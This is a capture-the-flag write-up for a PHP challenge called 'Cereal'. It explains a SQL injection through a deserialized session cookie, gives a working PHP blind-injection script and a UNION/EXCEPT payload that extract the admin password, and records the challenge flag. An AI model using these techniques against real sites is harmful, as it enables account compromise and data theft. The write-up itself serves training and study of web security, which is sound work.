# Cereal

Author: `FlamePyromancer`

Just made a new website. It's a work in progress, please don't judge...

## Solution

This challenge is vulnerable to SQL injection via the `refresh` function which is run when the session cookie is deserialized. The vulnerable parameter inside of the session is `id`. Using `profile.php` allows for leaking the admin's account information by setting the `id` to `0';--`. However, this does not give us the flag. It is presumed that the flag is probably in the password column, so I wrote a script to perform a blind injection to extract the flag.

```php
<?php
class User {
  public $username = 'guest';
  public $id = -1;
  protected $password = '5f4dcc3b5aa765d61d8327deb882cf99';
  protected $profile;
}

function curl($cookie) {
  $url = 'localhost:8000/profile.php';
  $headers = array('Cookie: auth=' . $cookie,);
  $curl = curl_init($url);
  curl_setopt($curl, CURLOPT_URL, $url);
  curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
  $resp = curl_exec($curl);
  curl_close($curl);
  return str_contains($resp, 'admin@admin.com');
}

function get_char($location) {
  $alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-!@#$%^&*(){}';
  $test = new User();

  foreach (str_split($alphabet) as $char) {
    $sqli = '1\' AND (SELECT hex(substr(password,' . $location . ',1)) FROM users WHERE username=\'admin\')=hex(\'' . $char . '\');--';
    $test->id = $sqli;

    if(curl(base64_encode(serialize($test))) === True) {
      return $char;
    }
  }
  print "search failed on position " . $location . "\xA";
  die();
}

$i = 1;
$flag = ''; 
print "FLAG: " . $flag . "\r";
while(($char=get_char($i)) != '}') {
  $flag = $flag . $char;
  print "FLAG: " . $flag . "\r";
  $i++;
}
$flag = $flag . $char;
print "FLAG: " . $flag . "\n";
?>
```

## Alternative Solution

We can see that in `config.php`, the `refresh` function, which is called when the user cookie is deserialized, fills the `$profile` variable which appears to be filled an array, the result of a SQL query for four different parameters in the user database. Since the SQL query is injectable through the `id` parameter, we can inject this SQL query in a way which will result in the `$profile` variable printing the results of the `admin` user by setting `id` to 0, and printing the `admin` user password by using the SQL injection to first exclude the previous database search using `except` keyword, and then `union` keyword to create our own query with the `admin` password. 

The query looks like this: 

```sql
0' except select username,email,favorite_cereal,creation_date from users where `id` = '0' union select username,email,password,creation_date from users where `id`='0'-- -
```

Once the `id` parameter is injected, the profile page at `profile.php` will print the password, which is the challenge flag, instead of the favorite cereal. 

Flag: `gigem{c3r3aL_t0o_sWe3t_t0d2y}`
